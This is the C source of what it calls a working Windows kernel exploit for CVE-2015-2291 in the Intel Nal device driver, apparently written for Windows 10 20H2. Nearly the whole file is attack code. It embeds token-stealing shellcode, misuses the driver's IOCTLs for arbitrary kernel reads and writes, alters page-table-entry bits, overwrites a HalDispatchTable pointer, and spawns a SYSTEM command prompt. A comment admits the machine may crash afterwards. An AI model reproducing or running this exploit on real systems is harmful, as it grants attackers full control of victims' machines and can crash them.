#include "exploit.h"

NtQueryIntervalProfile _NtQueryIntervalProfile = 0;

char shellcode[] =
{
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x48, 0x04, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x48, 0x04, 0x00,
	0x00, 0x48, 0x8B, 0x8B, 0x40, 0x04, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0xB8, 0x04, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0xB8, 0x04, 0x00, 0x00, 0xC3
};

int main(int argc, char** argv)
{
	HANDLE h_nal = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0), h_system_priv_process = 0;
	unsigned char unused = 0, * shellcode_pointer = 0;
	HMODULE h_ntdll = 0;
	unsigned long long nt_base_address = 0, * pte_address = 0;

	SetConsoleTitleA("CVE-2015-2291");

	printf("[*] CVE-2015-2291 Intel Nal Device Driver Exploit\n[*] Tested successfully on Windows 10 20H2 OS Build 19042.1110 64-bit\n[*] Written by ExAllocatePool2\n[>] Press \"ENTER\" when you are ready...");
	unused = getchar();
	printf("[!] Lets exploit!");
	Sleep(500);

	if (h_nal == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a driver handle to the Nal device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle to the Nal device driver. Handle Value: 0x%p", h_nal);

	h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!h_ntdll)
	{
		printf("\n[-] Failed to load the \"ntdll.dll\" API library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Loaded the \"ntdll.dll\" API library. Handle Value: 0x%p", h_ntdll);

	_NtQueryIntervalProfile = (NtQueryIntervalProfile)GetProcAddress(h_ntdll, "NtQueryIntervalProfile");
	if (!_NtQueryIntervalProfile)
	{
		printf("\n[-] Failed to locate the \"NtQueryIntervalProfile\" function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located the \"NtQueryIntervalProfile\" function. Function Address: 0x%p", _NtQueryIntervalProfile);

	nt_base_address = leak_ntoskrnl_base_address(h_ntdll);
	if (!nt_base_address)
	{
		return 1;
	}

	pte_address = (long long*)VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pte_address)
	{
		printf("\n[-] Failed to allocate stack memory for the leaked page table entry base address pointer. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated stack memory for the leaked page table entry base address pointer. Stack Memory Address: 0x%p", (long long*)pte_address);

	shellcode_pointer = (char*)VirtualAlloc(0x41410000, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!shellcode_pointer)
	{
		printf("\n[-] Failed to allocate stack memory for the kernel payload. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated stack memory for the kernel payload. Payload Address: 0x%p", (long long*)shellcode_pointer);

	memcpy(shellcode_pointer, &shellcode, sizeof(shellcode));
	printf("\n[+] Copied the kernel payload onto the stack allocation.");

	trigger_vulnerability(h_nal, nt_base_address, pte_address);
	system("start C:\\Windows\\System32\\cmd.exe");
	printf("\n[+] Exploit completed.");
	unused = getchar();
	return 0;
}

// TODO: Add a recovery routine, so the machine does not crash after a while.
void trigger_vulnerability(HANDLE h_nal, unsigned long long nt_base_address, unsigned long long* pte_address)
{
	MEMMOVE_INPUT_BUFFER memmove_input_struct;
	MEMSET_INPUT_BUFFER memset_input_struct;
	unsigned char output[2048];
	unsigned long bytes_returned = 0, interval = 0;
	unsigned long long current_pte_address = 0x41410000 >> 9, current_pte_contents = 0;
	current_pte_address &= 0x7FFFFFFFF8;

	RtlSecureZeroMemory(&memmove_input_struct, sizeof(memmove_input_struct));
	RtlSecureZeroMemory(&memset_input_struct, sizeof(memset_input_struct));
	RtlSecureZeroMemory(&output, sizeof(output));

	memmove_input_struct.JumpTableCode = 0x33;
	memmove_input_struct.Source = nt_base_address + MI_GET_PTE_ADDRESS_PLUS_0X13_OFFSET;
	memmove_input_struct.Destination = pte_address;
	memmove_input_struct.Length = 0x8;

	memset_input_struct.JumpTableCode = 0x30;
	memset_input_struct.Destination = nt_base_address + HAL_DISPATCH_TABLE_PLUS_0X8_OFFSET;

	printf("\n[+] Crafted input structures.\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering an arbitrary kernel read of \"MiGetPteAddress+0x13\" to leak the page table entry address...");

	DeviceIoControl(h_nal, TARGET_IOCTL, &memmove_input_struct, sizeof(memmove_input_struct), &output, sizeof(output), &bytes_returned, 0);
	current_pte_address += *pte_address;
	printf("\n[+] Calculated page table entry address. Page Table Entry Address: 0x%p\n[!] Triggering an arbitrary kernel dereference of the value stored at address 0x%p...", (unsigned long long*)current_pte_address, (unsigned long long*)current_pte_address);

	memmove_input_struct.Source = current_pte_address;
	memmove_input_struct.Destination = &current_pte_contents;
	DeviceIoControl(h_nal, TARGET_IOCTL, &memmove_input_struct, sizeof(memmove_input_struct), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Dereferenced page table entry address. Page Table Entry Bits: 0x%llx\n[!] Triggering an arbitrary overwrite of the page table entry flags...", current_pte_contents);

	current_pte_contents -= 0x4;
	memmove_input_struct.Source = &current_pte_contents;
	memmove_input_struct.Destination = current_pte_address;
	DeviceIoControl(h_nal, TARGET_IOCTL, &memmove_input_struct, sizeof(memmove_input_struct), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Marked the page as kernel memory. New Page Table Entry Bits: 0x%llx\n[!] Triggering an arbitrary overwrite of a kernel function pointer located in the \"HalDispatchTable+0x8\" function table...", current_pte_contents);

	memset_input_struct.Value = 0x00;
	memset_input_struct.Length = 0x8;
	DeviceIoControl(h_nal, TARGET_IOCTL, &memset_input_struct, sizeof(memset_input_struct), &output, sizeof(output), &bytes_returned, 0);

	memset_input_struct.Value = 0x41;
	memset_input_struct.Length = 0x4;
	DeviceIoControl(h_nal, TARGET_IOCTL, &memset_input_struct, sizeof(memset_input_struct), &output, sizeof(output), &bytes_returned, 0);

	memset_input_struct.Value = 0x0;
	memset_input_struct.Length = 0x2;
	DeviceIoControl(h_nal, TARGET_IOCTL, &memset_input_struct, sizeof(memset_input_struct), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Overwrote an arbitrary kernel function pointer located at \"HalDispatchTable+0x8\" function table.\n[!] Executing kernel payload...");

	_NtQueryIntervalProfile(2, &interval);

	printf("\n<---------------- | Leaving Danger Zone | ---------------->");
	Sleep(1000);

	return;
}